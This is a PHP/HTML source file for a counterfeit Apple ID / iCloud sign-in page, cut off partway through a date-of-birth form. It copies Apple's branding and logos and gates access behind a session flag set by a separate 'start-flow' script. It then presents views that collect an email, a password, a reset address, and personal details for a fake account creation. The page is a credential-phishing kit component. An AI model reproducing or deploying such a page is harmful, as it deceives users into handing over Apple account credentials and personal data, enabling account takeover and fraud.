<?php
session_start();

if (!isset($_SESSION['mera_verify_flow']) || empty($_SESSION['mera_verify_flow'])) {
    header("Location: ../start-flow.php?method=apple");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
      <link rel="icon" type="image/png" href="https://www.icloud.com/icloud_logo/icloud_logo.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Sign In - Apple ID</title>
    <style>
        body.light .continue-arrow {
    background: #e5e5ea;
    color: #000000;
}

        body.light .menu-btn {
    color: #000000;
}
body.light .icloud-logo {
    color: #000000;
}
body.light .icloud-logo-icon svg {
    fill: #000000;
}
        /* CSS Variables */
        :root {
            --apple-blue: #0a84ff;
            --apple-blue-hover: #409cff;
            --apple-blue-active: #0070d8;
            --text-primary: #f5f5f7;
            --text-secondary: #a1a1a6;
            --text-light: #86868b;
            --bg-dark: #000000;
            --card-bg: #1c1c1e;
            --card-bg-light: #2c2c2e;
            --border-color: #38383a;
            --input-bg: #1c1c1e;
            --input-focus: rgba(10, 132, 255, 0.4);
            --success-color: #30d158;
            --error-color: #ff453a;
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
            --shadow-md: 0 4px 20px rgba(0, 0, 0, 0.5);
            --shadow-lg: 0 12px 40px rgba(0, 0, 0, 0.7);
        }

        /* Reset and Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: var(--bg);;
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Header */
        header {
            padding: 0;
            background: transparent;
            position: relative;
        }

        .header-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 1.5rem;
            position: relative;
            z-index: 100;
        }

        .icloud-logo {
            display: flex;
            align-items: center;
            gap: 0.25rem;
            color: var(--text-primary);
            text-decoration: none;
            font-size: 1.125rem;
            font-weight: 500;
        }

        .icloud-logo-icon {
            display: inline-flex;
            align-items: center;
            width: 20px;
            height: 20px;
        }

        .icloud-logo-icon svg {
            width: 100%;
            height: 100%;
            fill: #ffffff;
        }

        .menu-btn {
            background: transparent;
            border: none;
            color: var(--text-primary);
            font-size: 1.5rem;
            cursor: pointer;
            padding: 0.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.2s ease;
        }

        .menu-btn:hover {
            opacity: 0.7;
        }

        .logo-section {
            padding: 0.5rem 2rem 0.5rem;
            text-align: center;
        }

        .logo-container {
            display: inline-block;
            position: relative;
            width: 160px;
            height: 160px;
            margin-bottom: 0.5rem;

        }

        .logo-dots-svg {
            width: 100%;
            height: 100%;
            animation: rotate 20s linear infinite;
        }

        .logo-apple-svg {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Main Container */
        .auth-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem 1rem 2rem;
        }

        .auth-card {
            background: var(--card-bg);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border-radius: 20px;
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 460px;
            padding: 3rem 2.5rem 3.5rem;
            position: relative;
            animation: fadeIn 0.4s ease;
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Auth Views */
        .auth-view {
            display: none;
            animation: slideIn 0.3s ease;
        }

        .auth-view.active {
            display: block;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .auth-title {
            font-size: 2rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 2.5rem;
            text-align: center;
            letter-spacing: -0.5px;
        }

        .auth-subtitle {
            font-size: 1rem;
            color: var(--text-secondary);
            margin-bottom: 2rem;
            text-align: center;
            line-height: 1.6;
        }

        .auth-email-display {
            font-size: 0.9375rem;
            color: var(--text-secondary);
            text-align: center;
            margin-bottom: 2rem;
            margin-top: -1.5rem;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 0.5rem;
            letter-spacing: -0.2px;
        }

        .input-wrapper {
            position: relative;
        }
body:not(.light) .form-input {
    background: rgba(28, 28, 30, 0.9);
}
body.light .logo-apple-svg path {
    fill: #000000 !important;
}
body.light .icloud-logo {
    color: #000000;
}
        .form-input {
            width: 100%;
            padding: 1rem 3rem 1rem 1.25rem;
            font-size: 1.0625rem;
            border: 1px solid var(--border-color);
            border-radius: 12px;
           background: #ffffff; /* ALWAYS WHITE IN LIGHT MODE */
            color: var(--text-primary);
            transition: all 0.2s ease;
            outline: none;
            font-family: inherit;
        }

        .form-input::placeholder {
            color: #6e6e73;
        }

        .form-input:focus {
            border-color: var(--border-color);
            background: var(--card-bg-light);
        }

        .form-input:hover {
            border-color: #48484a;
        }

        .form-input:disabled {
            background: var(--input-bg);
            opacity: 0.5;
            cursor: not-allowed;
        }

        .form-input.error {
            border-color: var(--error-color);
        }

        .form-input.error:focus {
            border-color: var(--error-color);
        }

        /* Continue Arrow Button */
        .continue-arrow {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            background: var(--border-color);
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            font-size: 1.125rem;
            padding: 0.5rem;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }

        .continue-arrow:hover {
            background: #48484a;
            color: var(--text-primary);
        }

        .continue-arrow:active {
            transform: translateY(-50%) scale(0.95);
        }

        /* Password Toggle */
        .password-toggle {
            position: absolute;
            right: 1rem;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            font-size: 0.875rem;
            padding: 0.25rem 0.5rem;
            transition: color 0.2s ease;
        }

        .password-toggle:hover {
            color: var(--apple-blue);
        }

        /* Password Strength Indicator */
        .password-strength {
            margin-top: 0.5rem;
            height: 4px;
            background: #e5e5ea;
            border-radius: 2px;
            overflow: hidden;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .password-strength.visible {
            opacity: 1;
        }

        .password-strength-bar {
            height: 100%;
            width: 0;
            transition: all 0.3s ease;
            border-radius: 2px;
        }

        .password-strength-bar.weak {
            width: 33%;
            background: var(--error-color);
        }

        .password-strength-bar.medium {
            width: 66%;
            background: #ff9500;
        }

        .password-strength-bar.strong {
            width: 100%;
            background: var(--success-color);
        }

        .password-strength-text {
            font-size: 0.75rem;
            color: var(--text-secondary);
            margin-top: 0.25rem;
        }

        /* Checkbox */
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            margin: 2rem 0;
            justify-content: center;
        }

        .checkbox-input {
            width: 20px;
            height: 20px;
            margin-right: 0.75rem;
            cursor: pointer;
            accent-color: var(--apple-blue);
            background: var(--input-bg);
            border: 1px solid var(--border-color);
        }

        .checkbox-label {
            font-size: 0.9375rem;
            color: var(--text-primary);
            cursor: pointer;
            user-select: none;
        }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 1rem 1.25rem;
            font-size: 1.0625rem;
            font-weight: 500;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: inherit;
            letter-spacing: -0.2px;
        }

        .btn-primary {
            background: var(--apple-blue);
            color: white;
        }

        .btn-primary:hover {
            background: var(--apple-blue-hover);
        }

        .btn-primary:active {
            background: var(--apple-blue-active);
            transform: scale(0.98);
        }

        .btn-primary:disabled {
            background: #48484a;
            cursor: not-allowed;
            opacity: 0.5;
        }

        /* Links */
        .auth-link {
            display: block;
            text-align: center;
            color: var(--apple-blue);
            text-decoration: none;
            font-size: 0.9375rem;
            margin-top: 1.25rem;
            transition: color 0.2s ease;
        }

        .auth-link:hover {
            color: var(--apple-blue-hover);
        }

        .divider {
            margin: 1.5rem 0;
            text-align: center;
            position: relative;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: var(--border-color);
        }

        .divider-text {
            position: relative;
            background: var(--card-bg);
            padding: 0 1rem;
            color: var(--text-secondary);
            font-size: 0.875rem;
        }

        /* Date of Birth Fields */
        .dob-group {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 0.75rem;
        }

        .form-select {
            width: 100%;
            padding: 1rem 1.25rem;
            font-size: 1.0625rem;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            background: var(--input-bg);
            color: var(--text-primary);
            cursor: pointer;
            transition: all 0.2s ease;
            outline: none;
            font-family: inherit;
        }

        .form-select:focus {
            border-color: var(--border-color);
            background: var(--card-bg-light);
        }

        .form-select:hover {
            border-color: #48484a;
        }

        .form-select option {
            background: var(--card-bg);
            color: var(--text-primary);
        }

        /* Message Box */
        .message-box {
            margin-top: 1.5rem;
            padding: 1rem 1.25rem;
            border-radius: 12px;
            font-size: 0.9375rem;
            display: none;
            animation: slideDown 0.3s ease;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .message-box.visible {
            display: block;
        }

        .message-box.success {
            background: rgba(48, 209, 88, 0.15);
            color: var(--success-color);
            border: 1px solid rgba(48, 209, 88, 0.3);
        }

        .message-box.error {
            background: rgba(255, 69, 58, 0.15);
            color: var(--error-color);
            border: 1px solid rgba(255, 69, 58, 0.3);
        }

        /* Footer */
        footer {
            padding: 2rem 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: var(--text-secondary);
            font-size: 0.8125rem;
            flex-wrap: wrap;
            gap: 1rem;
        }
.footer {
    width: 100%;
    padding: 1.2rem 2rem;
    background: transparent;

    display: flex;
    justify-content: space-between;
    align-items: center;

    font-size: 0.8rem;
    color: #6e6e73;
    flex-wrap: wrap;
    gap: 1rem;
}

.footer-left {
    display: flex;
    align-items: center;
    gap: 0.75rem;
    flex-wrap: wrap;
}

.footer-right {
    white-space: nowrap;
}

.footer-link {
    color: #6e6e73;
    text-decoration: none;
    transition: 0.2s;
}

.footer-link:hover {
    color: #1d1d1f;
}

.divider {
    color: #c7c7cc;
}
        .footer-links {
            display: flex;
            gap: 2rem;
            flex-wrap: wrap;
        }

        .footer-link {
            color: var(--text-secondary);
            text-decoration: none;
            transition: color 0.2s ease;
            white-space: nowrap;
        }

        .footer-link:hover {
            color: var(--text-primary);
        }

        .footer-copyright {
            color: var(--text-secondary);
            white-space: nowrap;
        }

        /* Responsive Design */
       @media (max-width: 768px) {

    /* FIX HEADER SPACING */
    .header-nav {
        padding: 0.5rem 0.9rem;
        height: 48px;
    }

    /* FIX AUTH CENTERING */
    .auth-container {
        padding: 0.5rem 0.75rem 1rem;
    }

    /* FIX CARD ON MOBILE */
    .auth-card {
        padding: 1.5rem 1.25rem;
        border-radius: 16px;
    }

    /* FIX TITLE SIZE */
    .auth-title {
        font-size: 1.5rem;
        margin-bottom: 1.5rem;
    }

    /* FIX LOGO SIZE */
    .logo-container {
        width: 120px;
        height: 120px;
    }

    /* FIX INPUT SPACING */
    .form-group {
        margin-bottom: 1rem;
    }

    /* FIX FOOTER SPACING (MAIN ISSUE YOU SEE) */
    .footer {
        padding: 0.8rem 1rem;
        font-size: 0.7rem;
        flex-direction: column;
        gap: 0.5rem;
        text-align: center;
    }
}
        @media (max-width: 480px) {
            .auth-card {
                padding: 1.5rem 1rem;
            }

            .auth-title {
                font-size: 1.5rem;
            }

            .auth-container {
                padding: 1rem 0;
            }

            .dob-group {
                grid-template-columns: 1fr;
            }
        }

        /* Loading State */
        .btn.loading {
            position: relative;
            color: transparent;
        }

        .btn.loading::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            top: 50%;
            left: 50%;
            margin-left: -10px;
            margin-top: -10px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        @keyframes shake {
    0% { transform: translateX(0); }
    20% { transform: translateX(-6px); }
    40% { transform: translateX(6px); }
    60% { transform: translateX(-4px); }
    80% { transform: translateX(4px); }
    100% { transform: translateX(0); }
}

.shake {
    animation: shake 0.35s ease;
}
:root {
    --bg: radial-gradient(ellipse at center, #2d2d2d 0%, #1a1a1a 50%, #000000 100%);
}
body.light {
    --text-primary: #000000;
    --text-secondary: #3a3a3c;
}
body.light {
    --bg: #f5f5f7;
}
body.light {
    --card-bg: #ffffff;
}
body.light .form-input {
    background: #ffffff !important;
    color: #000000;
    border: 1px solid #d2d2d7;
}
body:not(.light) .form-input {
    background: rgba(28, 28, 30, 0.9);
}
    </style>
</head>
<body class="<?php echo $theme; ?>">
       <header>
        <div class="header-nav">
            <a href="#" class="icloud-logo">
                <span class="icloud-logo-icon">
                    <svg viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
                        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"></path>
                    </svg>
                </span>
                <span>iCloud</span>
            </a>
            <button class="menu-btn" aria-label="Menu">
                <svg width="20" height="4" viewBox="0 0 20 4" fill="currentColor">
                    <circle cx="2" cy="2" r="2"></circle>
                    <circle cx="10" cy="2" r="2"></circle>
                    <circle cx="18" cy="2" r="2"></circle>
                </svg>
            </button>
        </div>
    </header>

    <main class="auth-container">
        <div class="auth-card">
 <div class="logo-section">
            <div class="logo-container">
                <!-- Rotating colorful dots -->
                <svg class="logo-dots-svg" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" draggable="false" aria-hidden="true">
                    <defs>
                        <linearGradient x1="100%" y1="100%" x2="50%" y2="50%" id="gradient1">
                            <stop stop-color="#8700FF" offset="0%"></stop>
                            <stop stop-color="#EE00E1" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <linearGradient x1="0%" y1="100%" x2="50%" y2="50%" id="gradient2">
                            <stop stop-color="#E00" offset="0%"></stop>
                            <stop stop-color="#EE00E1" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <linearGradient x1="100%" y1="0%" x2="50%" y2="50%" id="gradient3">
                            <stop stop-color="#00B1EE" offset="0%"></stop>
                            <stop stop-color="#00B1EE" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <linearGradient x1="-17.876%" y1="21.021%" x2="48.935%" y2="50%" id="gradient4">
                            <stop stop-color="#FFA456" offset="0%"></stop>
                            <stop stop-color="#FFA456" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <path d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z" id="dotsPath"></path>
                    </defs>
                    <use fill="#FFF" xlink:href="#dotsPath"></use>
                    <use fill="url(#gradient1)" xlink:href="#dotsPath"></use>
                    <use fill="url(#gradient2)" xlink:href="#dotsPath"></use>
                    <use fill="url(#gradient3)" xlink:href="#dotsPath"></use>
                    <use fill="url(#gradient4)" xlink:href="#dotsPath"></use>
                </svg>
                <!-- Stationary Apple logo -->
                <svg class="logo-apple-svg" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" draggable="false" aria-hidden="true">
                    <path fill="#FFFFFF" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"></path>
                </svg>
            </div>
        </div>
            <!-- Sign In View - Email Step -->
            <div id="signin-view" class="auth-view active">
                <h1 class="auth-title">Sign in with Apple Account</h1>
                
                <form id="signin-form">
                    <div class="form-group">
                        <div class="input-wrapper">
                          <input 
    type="email" 
    id="signin-email" 
    class="form-input" 
    placeholder="Email Address"
    autocomplete="off"
    required 
>
                            <button type="button" class="continue-arrow" id="continue-btn">→</button>
                        </div>
                    </div>
                </form>



                <a href="#" class="auth-link" id="show-forgot">Forgot password? →</a>
                <a href="#" class="auth-link" id="show-create">Create Apple Account</a>
            </div>

            <!-- Password Step -->
            <div id="password-view" class="auth-view">
                <h1 class="auth-title">Sign in with Apple Account</h1>
                <p class="auth-email-display" id="email-display"></p>
                
                <form id="password-form">
                    <div class="form-group">
                        <div class="input-wrapper">
                            <input 
                                type="password" 
                                name="eml"
                                id="signin-password" 
                                class="form-input" 
                                placeholder="Password"
                                autocomplete="current-password"
                                required
                            >
                            <button type="button" class="password-toggle" data-target="signin-password">Show</button>
                        </div>
                    </div>

                    <button type="submit" class="btn btn-primary">Continue</button>
                </form>

                <a href="#" class="auth-link" id="back-to-email">← Use a different Apple Account</a>
            </div>

            <!-- Forgot Password View -->
            <div id="forgot-view" class="auth-view">
                <h1 class="auth-title">Reset Password</h1>
                <p class="auth-subtitle">Enter your Apple ID to receive password reset instructions</p>
                
                <form id="forgot-form">
                    <div class="form-group">
                        <label class="form-label" for="forgot-email">Apple ID</label>
                        <input 
                            type="email" 
                            id="forgot-email" 
                            class="form-input" 
                            placeholder="name@example.com"
                            autocomplete="email"
                            required
                        >
                    </div>

                    <button type="submit" class="btn btn-primary">Send Reset Link</button>
                </form>

                <a href="#" class="auth-link" id="back-to-signin-1">Back to Sign In</a>
            </div>

            <!-- Create Account View -->
            <div id="create-view" class="auth-view">
                <h1 class="auth-title">Create Apple ID</h1>
                <p class="auth-subtitle">Enter your information to create a new account</p>
                
                <form id="create-form">
                    <div class="form-group">
                        <label class="form-label" for="create-name">Full Name</label>
                        <input 
                            type="text" 
                            id="create-name" 
                            class="form-input" 
                            placeholder="John Doe"
                            autocomplete="name"
                            required
                        >
                    </div>

                    <div class="form-group">
                        <label class="form-label" for="create-email">Email</label>
                        <input 
                            type="email" 
                            id="create-email" 
                            class="form-input" 
                            placeholder="name@example.com"
                            autocomplete="email"
                            required
                        >
                    </div>

                    <div class="form-group">
                        <label class="form-label" for="create-password">Password</label>
                        <div class="input-wrapper">
                            <input 
                                type="password" 
                                id="create-password" 
                                class="form-input" 
                                placeholder="Create a strong password"
                                autocomplete="new-password"
                                required
                            >
                            <button type="button" class="password-toggle" data-target="create-password">Show</button>
                        </div>
                        <div class="password-strength">
                            <div class="password-strength-bar"></div>
                        </div>
                        <div class="password-strength-text"></div>
                    </div>

                    <div class="form-group">
                        <label class="form-label" for="create-confirm">Confirm Password</label>
                        <div class="input-wrapper">
                            <input 
                                type="password" 
                                id="create-confirm" 
                                class="form-input" 
                                placeholder="Re-enter your password"
                                autocomplete="new-password"
                                required
                            >
                            <button type="button" class="password-toggle" data-target="create-confirm">Show</button>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Date of Birth</label>
                        <div class="dob-group">
                            <select id="dob-month" class="form-select" required>
                                <option value="">Month</option>
                                <option value="01">January</option>
                                <option value="02">February</option>
                                <option value="03">March</option>
                                <option value="04">April</option>
                                <option value="05">May</option>
                                <option value="06">June</option>
                                <option value="07">July</option>
                                <option value="08">August</option>
                                <option value="09">September</option>
                                <option value="10">October</option>
